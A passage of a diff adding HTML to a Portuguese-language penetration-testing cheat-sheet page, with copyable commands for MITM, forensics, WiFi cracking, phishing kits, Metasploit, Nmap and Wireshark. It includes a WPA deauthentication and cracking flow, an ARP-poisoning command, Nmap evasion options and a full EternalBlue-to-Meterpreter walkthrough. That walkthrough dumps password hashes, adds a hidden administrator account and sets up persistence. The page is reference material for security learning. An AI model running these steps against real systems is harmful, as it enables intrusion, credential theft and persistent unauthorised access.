+            <li><code>host 192.168.1.1</code>: Tráfego de/para um host</li>
+            <li><code>net 192.168.0.0/24</code>: Tráfego de/para uma rede</li>
+            <li><code>port 80 or port 443</code>: Tráfego HTTP ou HTTPS</li>
+            <li><code>tcp</code>, <code>udp</code>, <code>icmp</code>: Por protocolo</li>
+          </ul>
+        </div>
+
+        <div class="card">
+          <div class="card-header">Ettercap <span class="tool-category recon">RECON</span></div>
+          <p>Ferramenta para ataques man-in-the-middle (MITM).</p>
+          <div class="command">
+            <code>ettercap -TqM arp:remote /192.168.1.1/ /192.168.1.2/</code>
+            <button class="copy-btn" data-command="ettercap -TqM arp:remote /192.168.1.1/ /192.168.1.2/">Copiar</button>
+          </div>
+          <p>Interfaces disponíveis:</p>
+          <ul>
+            <li><code>-T</code>: Modo texto</li>
+            <li><code>-G</code>: Modo gráfico</li>
+            <li><code>-C</code>: Modo curses (TUI)</li>
+          </ul>
+          <p>Recursos:</p>
+          <ul>
+            <li>Sniffing de conexões SSH, HTTP, FTP</li>
+            <li>Filtros para manipulação de pacotes</li>
+            <li>ARP poisoning e DNS spoofing</li>
+            <li>Integrável com outros plugins</li>
+          </ul>
+        </div>
+
+        <h3 id="forensics">Análise Forense</h3>
+        <p>Ferramentas para análise forense e recuperação de dados.</p>
+
+        <div class="card">
+          <div class="card-header">Autopsy <span class="tool-category forensics">FORENSICS</span></div>
+          <p>Interface gráfica para plataforma forense digital The Sleuth Kit.</p>
+          <div class="command">
+            <code>autopsy</code>
+            <button class="copy-btn" data-command="autopsy">Copiar</button>
+          </div>
+          <p>Capacidades:</p>
+          <ul>
+            <li>Análise de timeline</li>
+            <li>Recuperação de arquivos</li>
+            <li>Pesquisa de palavras-chave</li>
+            <li>Extração de artefatos da web</li>
+            <li>Análise de registros e logs</li>
+            <li>Suporte a múltiplos sistemas de arquivos</li>
+          </ul>
+        </div>
+
+        <div class="card">
+          <div class="card-header">Foremost <span class="tool-category forensics">FORENSICS</span></div>
+          <p>Ferramenta para recuperação de arquivos baseada em cabeçalhos e footers.</p>
+          <div class="command">
+            <code>foremost -i /dev/sda1 -o /path/to/output</code>
+            <button class="copy-btn" data-command="foremost -i /dev/sda1 -o /path/to/output">Copiar</button>
+          </div>
+          <p>Tipos de arquivos recuperáveis:</p>
+          <ul>
+            <li>Imagens: jpg, gif, png, bmp</li>
+            <li>Documentos: pdf, doc, xls</li>
+            <li>Arquivos: zip, rar, exe</li>
+            <li>E muitos outros...</li>
+          </ul>
+        </div>
+
+        <div class="card">
+          <div class="card-header">Volatility <span class="tool-category forensics">FORENSICS</span></div>
+          <p>Framework para análise forense de memória.</p>
+          <div class="command">
+            <code>volatility -f memory.dump imageinfo</code>
+            <button class="copy-btn" data-command="volatility -f memory.dump imageinfo">Copiar</button>
+          </div>
+          <p>Plugins comuns:</p>
+          <ul>
+            <li><code>pslist</code>: Lista processos</li>
+            <li><code>netscan</code>: Conexões de rede</li>
+            <li><code>filescan</code>: Arquivos abertos</li>
+            <li><code>hivelist</code>: Lista hives do registro</li>
+            <li><code>malfind</code>: Procura código malicioso</li>
+            <li><code>cmdscan</code>: Comandos do cmd.exe</li>
+          </ul>
+        </div>
+
+        <h3 id="wireless">Segurança Wireless</h3>
+        <p>Ferramentas para testar a segurança de redes sem fio.</p>
+
+        <div class="card">
+          <div class="card-header">Aircrack-ng <span class="tool-category wireless">WIRELESS</span></div>
+          <p>Suite completa para auditoria de redes WiFi.</p>
+          <div class="command">
+            <code>airmon-ng start wlan0</code>
+            <button class="copy-btn" data-command="airmon-ng start wlan0">Copiar</button>
+          </div>
+          <p>Principais ferramentas da suite:</p>
+          <ul>
+            <li><code>airmon-ng</code>: Coloca interfaces em modo monitor</li>
+            <li><code>airodump-ng</code>: Captura pacotes e mostra redes disponíveis</li>
+            <li><code>aireplay-ng</code>: Injeta pacotes para diferentes ataques</li>
+            <li><code>aircrack-ng</code>: Quebra chaves WEP/WPA/WPA2-PSK</li>
+          </ul>
+          <p>Fluxo básico para captura de handshake WPA:</p>
+          <pre>
+# Colocar interface em modo monitor
+airmon-ng start wlan0
+
+# Capturar tráfego e encontrar o alvo
+airodump-ng wlan0mon
+
+# Focar na rede alvo e salvar captura
+airodump-ng -c [canal] --bssid [MAC] -w captura wlan0mon
+
+# Em outro terminal, forçar desautenticação
+aireplay-ng -0 1 -a [MAC_AP] -c [MAC_CLIENTE] wlan0mon
+
+# Quebrar senha com dicionário
+aircrack-ng -w wordlist.txt captura*.cap</pre>
+        </div>
+
+        <div class="card">
+          <div class="card-header">Wifite <span class="tool-category wireless">WIRELESS</span></div>
+          <p>Ferramenta automatizada para ataque a redes wireless.</p>
+          <div class="command">
+            <code>wifite</code>
+            <button class="copy-btn" data-command="wifite">Copiar</button>
+          </div>
+          <p>Características:</p>
+          <ul>
+            <li>Interface simplificada</li>
+            <li>Detecta redes automaticamente</li>
+            <li>Ataca WEP, WPA/WPA2, WPS</li>
+            <li>Integração com outras ferramentas (Aircrack-ng, Reaver)</li>
+          </ul>
+        </div>
+
+        <div class="card">
+          <div class="card-header">Kismet <span class="tool-category wireless">WIRELESS</span></div>
+          <p>Detector, sniffer e sistema IDS para redes wireless.</p>
+          <div class="command">
+            <code>kismet</code>
+            <button class="copy-btn" data-command="kismet">Copiar</button>
+          </div>
+          <p>Recursos:</p>
+          <ul>
+            <li>Detecção passiva de redes (sem transmitir pacotes)</li>
+            <li>Localização de pontos de acesso por GPS</li>
+            <li>Captura de pacotes para análise</li>
+            <li>Detecção de ataques wireless</li>
+            <li>Interface web e logs detalhados</li>
+          </ul>
+        </div>
+
+        <h3 id="social">Engenharia Social</h3>
+        <p>Ferramentas para testes de phishing e engenharia social.</p>
+
+        <div class="card">
+          <div class="card-header">Social-Engineer Toolkit (SET) <span class="tool-category social">SOCIAL</span></div>
+          <p>Framework para ataques de engenharia social.</p>
+          <div class="command">
+            <code>setoolkit</code>
+            <button class="copy-btn" data-command="setoolkit">Copiar</button>
+          </div>
+          <p>Tipos de ataques:</p>
+          <ul>
+            <li>Ataques de phishing</li>
+            <li>Clonagem de sites</li>
+            <li>Criação de payload infectado</li>
+            <li>Ataques de spear-phishing</li>
+            <li>Criação de QR code malicioso</li>
+            <li>Captura de credenciais</li>
+          </ul>
+        </div>
+
+        <div class="card">
+          <div class="card-header">GoPhish <span class="tool-category social">SOCIAL</span></div>
+          <p>Framework open-source para campanhas de phishing.</p>
+          <div class="command">
+            <code>gophish</code>
+            <button class="copy-btn" data-command="gophish">Copiar</button>
+          </div>
+          <p>Recursos:</p>
+          <ul>
+            <li>Interface web amigável</li>
+            <li>Templates de e-mail e landing pages</li>
+            <li>Gerenciamento de campanhas</li>
+            <li>Relatórios detalhados</li>
+            <li>Acompanhamento em tempo real</li>
+          </ul>
+        </div>
+      </section>
+
+      <section id="metasploit" class="section cybersec">
+        <h2>Metasploit Framework</h2>
+        <p>O Metasploit Framework é uma das ferramentas mais poderosas para testes de penetração, permitindo descobrir,
+          explorar e validar vulnerabilidades.</p>
+
+        <div class="info-box cybersec">
+          <div class="info-box-title">Componentes do Metasploit</div>
+          <ul>
+            <li><strong>msfconsole</strong>: Interface principal de linha de comando</li>
+            <li><strong>Exploits</strong>: Código que aproveita vulnerabilidades em sistemas</li>
+            <li><strong>Payloads</strong>: Código que é executado após exploração bem-sucedida</li>
+            <li><strong>Auxiliares</strong>: Ferramentas de varredura, enumeração e verificação</li>
+            <li><strong>Encoders</strong>: Modificam payloads para evitar detecção</li>
+            <li><strong>NOPs</strong>: Usado para estabilizar os payloads</li>
+            <li><strong>Post</strong>: Módulos para usar após ter acesso ao sistema</li>
+          </ul>
+        </div>
+
+        <h3 id="msfconsole">Interface MSFconsole</h3>
+        <p>A MSFconsole é a interface principal para o Metasploit Framework.</p>
+
+        <div class="command">
+          <code>msfconsole</code>
+          <button class="copy-btn" data-command="msfconsole">Copiar</button>
+        </div>
+
+        <p>Comandos básicos da MSFconsole:</p>
+        <div class="table-container">
+          <table>
+            <thead>
+              <tr>
+                <th>Comando</th>
+                <th>Descrição</th>
+                <th>Exemplo</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><code>help</code></td>
+                <td>Mostra ajuda sobre comandos</td>
+                <td><code>help search</code></td>
+              </tr>
+              <tr>
+                <td><code>search</code></td>
+                <td>Busca módulos</td>
+                <td><code>search type:exploit platform:windows apache</code></td>
+              </tr>
+              <tr>
+                <td><code>use</code></td>
+                <td>Seleciona um módulo</td>
+                <td><code>use exploit/windows/smb/ms17_010_eternalblue</code></td>
+              </tr>
+              <tr>
+                <td><code>info</code></td>
+                <td>Mostra informações sobre o módulo atual</td>
+                <td><code>info</code></td>
+              </tr>
+              <tr>
+                <td><code>show options</code></td>
+                <td>Mostra opções disponíveis para o módulo</td>
+                <td><code>show options</code></td>
+              </tr>
+              <tr>
+                <td><code>set</code></td>
+                <td>Define valor para uma opção</td>
+                <td><code>set RHOSTS 192.168.1.10</code></td>
+              </tr>
+              <tr>
+                <td><code>setg</code></td>
+                <td>Define valor global para todos os módulos</td>
+                <td><code>setg RHOSTS 192.168.1.0/24</code></td>
+              </tr>
+              <tr>
+                <td><code>unset</code></td>
+                <td>Remove valor de uma opção</td>
+                <td><code>unset PAYLOAD</code></td>
+              </tr>
+              <tr>
+                <td><code>exploit</code> / <code>run</code></td>
+                <td>Executa o módulo</td>
+                <td><code>exploit</code></td>
+              </tr>
+              <tr>
+                <td><code>sessions</code></td>
+                <td>Lista sessões ativas</td>
+                <td><code>sessions -l</code></td>
+              </tr>
+              <tr>
+                <td><code>back</code></td>
+                <td>Volta para o prompt principal</td>
+                <td><code>back</code></td>
+              </tr>
+              <tr>
+                <td><code>db_nmap</code></td>
+                <td>Executa nmap e armazena no banco</td>
+                <td><code>db_nmap -sV 192.168.1.1</code></td>
+              </tr>
+              <tr>
+                <td><code>workspace</code></td>
+                <td>Gerencia workspaces</td>
+                <td><code>workspace -a projeto1</code></td>
+              </tr>
+              <tr>
+                <td><code>hosts</code></td>
+                <td>Lista hosts no banco</td>
+                <td><code>hosts</code></td>
+              </tr>
+              <tr>
+                <td><code>services</code></td>
+                <td>Lista serviços no banco</td>
+                <td><code>services -p 80</code></td>
+              </tr>
+              <tr>
+                <td><code>vulns</code></td>
+                <td>Lista vulnerabilidades encontradas</td>
+                <td><code>vulns</code></td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3 id="modules">Módulos</h3>
+        <p>Metasploit organiza suas funcionalidades em diferentes tipos de módulos:</p>
+
+        <div class="comparison-grid">
+          <div class="card">
+            <div class="card-header">Exploits</div>
+            <p>Módulos que exploram vulnerabilidades específicas.</p>
+            <p>Exemplos comuns:</p>
+            <ul>
+              <li><code>exploit/windows/smb/ms17_010_eternalblue</code></li>
+              <li><code>exploit/multi/http/apache_struts2_rest_xstream</code></li>
+              <li><code>exploit/unix/webapp/drupal_drupalgeddon2</code></li>
+            </ul>
+          </div>
+
+          <div class="card">
+            <div class="card-header">Auxiliares</div>
+            <p>Módulos para reconhecimento, verificação e tarefas auxiliares.</p>
+            <p>Exemplos comuns:</p>
+            <ul>
+              <li><code>auxiliary/scanner/http/dir_scanner</code></li>
+              <li><code>auxiliary/scanner/smb/smb_version</code></li>
+              <li><code>auxiliary/scanner/ssh/ssh_login</code></li>
+            </ul>
+          </div>
+
+          <div class="card">
+            <div class="card-header">Post-Exploitation</div>
+            <p>Módulos para usar após obter acesso ao sistema.</p>
+            <p>Exemplos comuns:</p>
+            <ul>
+              <li><code>post/windows/gather/hashdump</code></li>
+              <li><code>post/linux/gather/hashdump</code></li>
+              <li><code>post/windows/manage/persistence</code></li>
+            </ul>
+          </div>
+
+          <div class="card">
+            <div class="card-header">Encoders</div>
+            <p>Módulos para codificar payloads visando evitar detecção.</p>
+            <p>Exemplos comuns:</p>
+            <ul>
+              <li><code>encoder/x86/shikata_ga_nai</code></li>
+              <li><code>encoder/cmd/powershell_base64</code></li>
+              <li><code>encoder/x64/xor</code></li>
+            </ul>
+          </div>
+        </div>
+
+        <h3 id="payloads">Payloads</h3>
+        <p>Payloads são códigos executados no alvo após uma exploração bem-sucedida.</p>
+
+        <div class="tabs">
+          <button class="tab-btn active" data-tab="singles">Singles</button>
+          <button class="tab-btn" data-tab="stagers">Stagers</button>
+          <button class="tab-btn" data-tab="stages">Stages</button>
+        </div>
+
+        <div id="singles" class="tab-content active">
+          <p>Payloads independentes que executam uma ação específica.</p>
+          <ul>
+            <li><code>windows/exec</code>: Executa um comando</li>
+            <li><code>linux/x86/exec</code>: Executa um comando em Linux</li>
+            <li><code>windows/adduser</code>: Adiciona um usuário</li>
+            <li><code>linux/x86/chmod</code>: Muda permissões de arquivo</li>
+          </ul>
+          <p>Exemplo de uso:</p>
+          <div class="command">
+            <code>set PAYLOAD windows/exec</code>
+            <button class="copy-btn" data-command="set PAYLOAD windows/exec">Copiar</button>
+          </div>
+          <div class="command">
+            <code>set CMD calc.exe</code>
+            <button class="copy-btn" data-command="set CMD calc.exe">Copiar</button>
+          </div>
+        </div>
+
+        <div id="stagers" class="tab-content">
+          <p>Pequenos payloads que estabelecem uma conexão para baixar e executar um stage maior.</p>
+          <ul>
+            <li><code>windows/reverse_tcp</code>: Conecta de volta ao atacante</li>
+            <li><code>windows/bind_tcp</code>: Abre uma porta para conexão do atacante</li>
+            <li><code>linux/x86/reverse_tcp</code>: Reverse shell para Linux</li>
+          </ul>
+          <p>Usado em combinação com stages, formando payloads como:</p>
+          <div class="command">
+            <code>set PAYLOAD windows/meterpreter/reverse_tcp</code>
+            <button class="copy-btn" data-command="set PAYLOAD windows/meterpreter/reverse_tcp">Copiar</button>
+          </div>
+        </div>
+
+        <div id="stages" class="tab-content">
+          <p>A parte principal do payload, carregada pelo stager.</p>
+          <ul>
+            <li><code>meterpreter</code>: Shell avançada com muitos recursos</li>
+            <li><code>shell</code>: Shell de comando padrão</li>
+            <li><code>vncinject</code>: Controle VNC da tela remota</li>
+            <li><code>dllinject</code>: Injeção de DLL arbitrária</li>
+          </ul>
+        </div>
+
+        <h3 id="meterpreter">Meterpreter</h3>
+        <p>Meterpreter é uma shell avançada que funciona inteiramente na memória e oferece muitos recursos para
+          pós-exploração.</p>
+
+        <div class="table-container">
+          <table>
+            <thead>
+              <tr>
+                <th>Comando</th>
+                <th>Descrição</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><code>help</code></td>
+                <td>Lista todos os comandos disponíveis</td>
+              </tr>
+              <tr>
+                <td><code>sysinfo</code></td>
+                <td>Mostra informações do sistema</td>
+              </tr>
+              <tr>
+                <td><code>getuid</code></td>
+                <td>Mostra o usuário atual</td>
+              </tr>
+              <tr>
+                <td><code>ps</code></td>
+                <td>Lista processos em execução</td>
+              </tr>
+              <tr>
+                <td><code>migrate PID</code></td>
+                <td>Migra o Meterpreter para outro processo</td>
+              </tr>
+              <tr>
+                <td><code>shell</code></td>
+                <td>Inicia uma shell do sistema</td>
+              </tr>
+              <tr>
+                <td><code>hashdump</code></td>
+                <td>Extrai hashes de senhas em sistemas Windows</td>
+              </tr>
+              <tr>
+                <td><code>screenshot</code></td>
+                <td>Captura a tela do alvo</td>
+              </tr>
+              <tr>
+                <td><code>webcam_snap</code></td>
+                <td>Tira foto pela webcam</td>
+              </tr>
+              <tr>
+                <td><code>keyscan_start</code></td>
+                <td>Inicia keylogger</td>
+              </tr>
+              <tr>
+                <td><code>keyscan_dump</code></td>
+                <td>Mostra dados capturados do keylogger</td>
+              </tr>
+              <tr>
+                <td><code>upload file</code></td>
+                <td>Envia arquivo para o alvo</td>
+              </tr>
+              <tr>
+                <td><code>download file</code></td>
+                <td>Baixa arquivo do alvo</td>
+              </tr>
+              <tr>
+                <td><code>portfwd</code></td>
+                <td>Configura redirecionamento de portas</td>
+              </tr>
+              <tr>
+                <td><code>clearev</code></td>
+                <td>Limpa logs de eventos em sistemas Windows</td>
+              </tr>
+              <tr>
+                <td><code>getsystem</code></td>
+                <td>Tenta escalar privilégios</td>
+              </tr>
+              <tr>
+                <td><code>run post/MÓDULO</code></td>
+                <td>Executa módulo post-exploitation</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <p>Exemplo de fluxo de uso do Metasploit:</p>
+        <pre>
+# Iniciar o Metasploit
+msfconsole
+
+# Buscar exploits para Eternal Blue
+search eternalblue
+
+# Selecionar exploit
+use exploit/windows/smb/ms17_010_eternalblue
+
+# Ver opções necessárias
+show options
+
+# Configurar alvo
+set RHOSTS 192.168.1.10
+
+# Selecionar payload
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+
+# Configurar handler
+set LHOST 192.168.1.5  # IP da máquina atacante
+set LPORT 4444
+
+# Executar exploit
+exploit
+
+# Agora no Meterpreter
+sysinfo
+getuid
+
+# Tentar escalar privilégios
+getsystem
+
+# Extrair hashes de senhas
+hashdump
+
+# Criar usuário persistente
+shell
+net user hacker P@ssw0rd /add
+net localgroup administrators hacker /add
+exit
+
+# Configurar persistência
+run post/windows/manage/persistence
+
+# Encerrar sessão
+exit</pre>
+      </section>
+
+      <section id="nmap" class="section cybersec">
+        <h2>Nmap Avançado</h2>
+        <p>O Nmap (Network Mapper) é uma ferramenta de código aberto para descoberta de rede e auditoria de segurança.
+          Vamos explorar recursos avançados.</p>
+
+        <h3 id="port-scan">Tipos de Scan</h3>
+        <div class="comparison-grid">
+          <div class="card">
+            <div class="card-header">SYN Scan (<code>-sS</code>)</div>
+            <p>O tipo de scan padrão, rápido e relativamente discreto.</p>
+            <div class="command">
+              <code>nmap -sS 192.168.1.1</code>
+              <button class="copy-btn" data-command="nmap -sS 192.168.1.1">Copiar</button>
+            </div>
+            <p>Como funciona:</p>
+            <ul>
+              <li>Envia pacote SYN</li>
+              <li>Se receber SYN/ACK, porta está aberta</li>
+              <li>Se receber RST, porta está fechada</li>
+              <li>Não completa as conexões TCP</li>
+            </ul>
+          </div>
+
+          <div class="card">
+            <div class="card-header">TCP Connect Scan (<code>-sT</code>)</div>
+            <p>Scan completo que estabelece uma conexão.</p>
+            <div class="command">
+              <code>nmap -sT 192.168.1.1</code>
+              <button class="copy-btn" data-command="nmap -sT 192.168.1.1">Copiar</button>
+            </div>
+            <p>Como funciona:</p>
+            <ul>
+              <li>Completa o handshake TCP de 3 vias</li>
+              <li>Mais detectável em logs</li>
+              <li>Mais confiável em alguns casos</li>
+              <li>Usado por default quando não se tem privilégios</li>
+            </ul>
+          </div>
+
+          <div class="card">
+            <div class="card-header">UDP Scan (<code>-sU</code>)</div>
+            <p>Verifica portas UDP abertas, que são frequentemente ignoradas.</p>
+            <div class="command">
+              <code>nmap -sU 192.168.1.1</code>
+              <button class="copy-btn" data-command="nmap -sU 192.168.1.1">Copiar</button>
+            </div>
+            <p>Como funciona:</p>
+            <ul>
+              <li>Envia pacotes UDP para as portas alvo</li>
+              <li>"ICMP port unreachable" significa porta fechada</li>
+              <li>Resposta ou ausência sugere porta aberta/filtrada</li>
+              <li>Geralmente lento, combine com <code>--top-ports</code></li>
+            </ul>
+          </div>
+
+          <div class="card">
+            <div class="card-header">FIN, NULL, XMAS Scans (<code>-sF</code>, <code>-sN</code>, <code>-sX</code>)</div>
+            <p>Scans furtivos para contornar firewalls e detecção.</p>
+            <div class="command">
+              <code>nmap -sF 192.168.1.1</code>
+              <button class="copy-btn" data-command="nmap -sF 192.168.1.1">Copiar</button>
+            </div>
+            <p>Como funcionam:</p>
+            <ul>
+              <li>FIN: Envia pacote com flag FIN</li>
+              <li>NULL: Envia pacote sem flags</li>
+              <li>XMAS: Envia pacote com flags FIN, PSH e URG</li>
+              <li>RST para portas fechadas, sem resposta para abertas/filtradas</li>
+              <li>Não funciona bem contra sistemas Windows</li>
+            </ul>
+          </div>
+
+          <div class="card">
+            <div class="card-header">Detecção de Versão (<code>-sV</code>)</div>
+            <p>Determina serviços e versões em portas detectadas.</p>
+            <div class="command">
+              <code>nmap -sV --version-intensity 9 192.168.1.1</code>
+              <button class="copy-btn" data-command="nmap -sV --version-intensity 9 192.168.1.1">Copiar</button>
+            </div>
+            <p>Opções adicionais:</p>
+            <ul>
+              <li><code>--version-intensity</code>: Define agressividade (0-9)</li>
+              <li><code>--version-light</code>: Rápido (intensidade 2)</li>
+              <li><code>--version-all</code>: Testes completos (intensidade 9)</li>
+              <li><code>--version-trace</code>: Mostra testes sendo realizados</li>
+            </ul>
+          </div>
+
+          <div class="card">
+            <div class="card-header">OS Detection (<code>-O</code>)</div>
+            <p>Tenta identificar o sistema operacional do alvo.</p>
+            <div class="command">
+              <code>nmap -O --osscan-guess 192.168.1.1</code>
+              <button class="copy-btn" data-command="nmap -O --osscan-guess 192.168.1.1">Copiar</button>
+            </div>
+            <p>Opções relacionadas:</p>
+            <ul>
+              <li><code>--osscan-limit</code>: Só tenta identificar alvos promissores</li>
+              <li><code>--osscan-guess</code>: Mostrar palpites agressivos</li>
+              <li><code>--max-os-tries</code>: Limita número de tentativas</li>
+            </ul>
+          </div>
+
+          <h3 id="scripts-nse">Scripts NSE (Nmap Scripting Engine)</h3>
+          <p>NSE estende as funcionalidades do Nmap com scripts Lua para diversas tarefas.</p>
+
+          <div class="command">
+            <code>nmap --script=vuln 192.168.1.1</code>
+            <button class="copy-btn" data-command="nmap --script=vuln 192.168.1.1">Copiar</button>
+          </div>
+
+          <p>Categorias principais de scripts:</p>
+          <div class="table-container">
+            <table>
+              <thead>
+                <tr>
+                  <th>Categoria</th>
+                  <th>Descrição</th>
+                  <th>Exemplo</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td><code>default</code></td>
+                  <td>Scripts padrão executados com <code>-sC</code></td>
+                  <td><code>nmap -sC 192.168.1.1</code></td>
+                </tr>
+                <tr>
+                  <td><code>safe</code></td>
+                  <td>Scripts não intrusivos</td>
+                  <td><code>--script=safe</code></td>
+                </tr>
+                <tr>
+                  <td><code>vuln</code></td>
+                  <td>Detecta vulnerabilidades</td>
+                  <td><code>--script=vuln</code></td>
+                </tr>
+                <tr>
+                  <td><code>exploit</code></td>
+                  <td>Tenta explorar vulnerabilidades</td>
+                  <td><code>--script=exploit</code></td>
+                </tr>
+                <tr>
+                  <td><code>auth</code></td>
+                  <td>Tenta burlar autenticação</td>
+                  <td><code>--script=auth</code></td>
+                </tr>
+                <tr>
+                  <td><code>brute</code></td>
+                  <td>Força bruta em credenciais</td>
+                  <td><code>--script=brute</code></td>
+                </tr>
+                <tr>
+                  <td><code>discovery</code></td>
+                  <td>Coleta informações adicionais</td>
+                  <td><code>--script=discovery</code></td>
+                </tr>
+                <tr>
+                  <td><code>dos</code></td>
+                  <td>Scripts que podem causar DoS</td>
+                  <td><code>--script=dos</code></td>
+                </tr>
+                <tr>
+                  <td><code>intrusive</code></td>
+                  <td>Scripts que podem impactar o alvo</td>
+                  <td><code>--script=intrusive</code></td>
+                </tr>
+                <tr>
+                  <td><code>malware</code></td>
+                  <td>Detecta backdoors e malware</td>
+                  <td><code>--script=malware</code></td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+
+          <p>Exemplos de scripts NSE úteis:</p>
+          <div class="command">
+            <code>nmap --script=http-title 192.168.1.1</code>
+            <button class="copy-btn" data-command="nmap --script=http-title 192.168.1.1">Copiar</button>
+          </div>
+          <div class="command">
+            <code>nmap --script=ssl-enum-ciphers --script-args=vulns.showall 192.168.1.1 -p 443</code>
+            <button class="copy-btn"
+              data-command="nmap --script=ssl-enum-ciphers --script-args=vulns.showall 192.168.1.1 -p 443">Copiar</button>
+          </div>
+          <div class="command">
+            <code>nmap --script=smb-os-discovery 192.168.1.1</code>
+            <button class="copy-btn" data-command="nmap --script=smb-os-discovery 192.168.1.1">Copiar</button>
+          </div>
+          <div class="command">
+            <code>nmap --script=dns-zone-transfer --script-args=dns-zone-transfer.domain=example.com -p 53 ns.example.com</code>
+            <button class="copy-btn"
+              data-command="nmap --script=dns-zone-transfer --script-args=dns-zone-transfer.domain=example.com -p 53 ns.example.com">Copiar</button>
+          </div>
+
+          <h3 id="evasion">Técnicas de Evasão</h3>
+          <p>Opções para tornar os scans menos detectáveis por sistemas de segurança.</p>
+
+          <div class="card">
+            <div class="card-header">Fragmentação (<code>-f</code>)</div>
+            <p>Divide pacotes TCP em fragmentos menores.</p>
+            <div class="command">
+              <code>nmap -f 192.168.1.1</code>
+              <button class="copy-btn" data-command="nmap -f 192.168.1.1">Copiar</button>
+            </div>
+            <p>Use <code>-ff</code> para fragmentos ainda menores.</p>
+          </div>
+
+          <div class="card">
+            <div class="card-header">Decoys (<code>-D</code>)</div>
+            <p>Esconde origem real entre vários IPs de origem falsos.</p>
+            <div class="command">
+              <code>nmap -D 10.0.0.1,10.0.0.2,ME 192.168.1.1</code>
+              <button class="copy-btn" data-command="nmap -D 10.0.0.1,10.0.0.2,ME 192.168.1.1">Copiar</button>
+            </div>
+            <p>"ME" representa seu próprio IP na lista de decoys.</p>
+          </div>
+
+          <div class="card">
+            <div class="card-header">Spoofing (<code>-S</code>)</div>
+            <p>Falsifica o endereço IP de origem (requer acesso privilegiado).</p>
+            <div class="command">
+              <code>nmap -S 10.0.0.1 192.168.1.1</code>
+              <button class="copy-btn" data-command="nmap -S 10.0.0.1 192.168.1.1">Copiar</button>
+            </div>
+            <p>Útil principalmente para determinar regras de firewall.</p>
+          </div>
+
+          <div class="card">
+            <div class="card-header">Timing (<code>-T</code>)</div>
+            <p>Controla a velocidade do scan para ser menos detectável.</p>
+            <div class="command">
+              <code>nmap -T0 192.168.1.1</code>
+              <button class="copy-btn" data-command="nmap -T0 192.168.1.1">Copiar</button>
+            </div>
+            <p>Templates de timing:</p>
+            <ul>
+              <li><code>-T0</code> (Paranóico): Muito lento, um porto por vez</li>
+              <li><code>-T1</code> (Furtivo): Lento, detecta menos IDS</li>
+              <li><code>-T2</code> (Educado): Lento, usa menos recursos</li>
+              <li><code>-T3</code> (Normal): Comportamento padrão</li>
+              <li><code>-T4</code> (Agressivo): Rápido em redes confiáveis</li>
+              <li><code>-T5</code> (Insano): Muito rápido, pode perder informações</li>
+            </ul>
+          </div>
+
+          <p>Scan completo para auditoria:</p>
+          <div class="command">
+            <code>nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY --script "default or (discovery and safe)" 192.168.1.0/24</code>
+            <button class="copy-btn"
+              data-command="nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY --script 'default or (discovery and safe)' 192.168.1.0/24">Copiar</button>
+          </div>
+      </section>
+
+      <section id="wireshark" class="section cybersec">
+        <h2>Wireshark</h2>
+        <p>O Wireshark é um analisador de protocolo de rede usado para captura e inspeção interativa do tráfego em uma
+          rede.</p>
+
+        <h3 id="capture">Capturas</h3>
+        <p>Para iniciar o Wireshark com interface gráfica:</p>
+        <div class="command">
+          <code>wireshark</code>
+          <button class="copy-btn" data-command="wireshark">Copiar</button>
+        </div>
+
+        <p>Para capturas via linha de comando:</p>
+        <div class="command">
+          <code>tshark -i eth0 -w captura.pcap</code>
+          <button class="copy-btn" data-command="tshark -i eth0 -w captura.pcap">Copiar</button>
+        </div>
+
+        <div class="info-box cybersec">
+          <div class="info-box-title">Dicas para Captura</div>
+          <ul>
+            <li>Use o modo promíscuo para capturar todo o tráfego na rede</li>
+            <li>Utilize filtros de captura para reduzir o volume de dados</li>
+            <li>Para redes com switch, considere técnicas como port mirroring ou uso de hub</li>
+            <li>Em VLANs, configure a interface para capturar a VLAN correta</li>
+            <li>Em redes sem fio, use o modo monitor para capturar todo o tráfego</li>
+          </ul>
+        </div>
+
+        <h3 id="filters">Filtros</h3>
+        <p>Wireshark utiliza dois tipos de filtros:</p>
+
+        <div class="card">
+          <div class="card-header">Filtros de Captura</div>
+          <p>Aplicados durante a captura para reduzir a quantidade de pacotes.</p>
+          <p>Utilizados no campo "Capture Filter" ou com opção <code>-f</code> no tshark.</p>
+          <p>Exemplos:</p>
+          <ul>
+            <li><code>host 192.168.1.1</code>: Tráfego de/para um host</li>
+            <li><code>net 192.168.0.0/24</code>: Tráfego de/para uma rede</li>
+            <li><code>port 80</code>: Tráfego para/de porta 80</li>
+            <li><code>tcp port 80 or tcp port 443</code>: HTTP ou HTTPS</li>
+            <li><code>not arp</code>: Exclui tráfego ARP</li>
+          </ul>
+        </div>
+
+        <div class="card">
+          <div class="card-header">Filtros de Exibição</div>
+          <p>Aplicados após a captura para filtrar os pacotes mostrados.</p>
+          <p>Utilizados no campo "Display Filter" na interface.</p>
+          <p>Exemplos:</p>
+          <ul>
+            <li><code>ip.addr == 192.168.1.1</code>: Pacotes de/para um IP</li>
+            <li><code>http</code>: Tráfego HTTP</li>
+            <li><code>tcp.port == 80 or tcp.port == 443</code>: HTTP ou HTTPS</li>
+            <li><code>http.request.method == "POST"</code>: Requisições POST</li>
+            <li><code>tcp.flags.syn == 1</code>: Pacotes SYN</li>
+            <li><code>dns.qry.name contains "google"</code>: Consultas DNS com "google"</li>
+            <li><code>!(arp or dns or icmp)</code>: Exclui ARP, DNS e ICMP</li>
+          </ul>
+        </div>
+
+        <div class="command">
+          <code>tshark -i eth0 -f "port 80" -Y "http.request.method == GET"</code>
+          <button class="copy-btn"
+            data-command="tshark -i eth0 -f 'port 80' -Y 'http.request.method == GET'">Copiar</button>
+        </div>
+
+        <h3 id="analysis">Análise de Pacotes</h3>
+        <div class="table-container">
+          <table>
+            <thead>
+              <tr>
+                <th>Tipo de Análise</th>
+                <th>Filtros/Ferramentas</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td>Análise de fluxo TCP</td>
+                <td>Statistics > Flow Graph, ou <br><code>tcp.stream eq 0</code> para ver um fluxo específico</td>
+              </tr>
+              <tr>
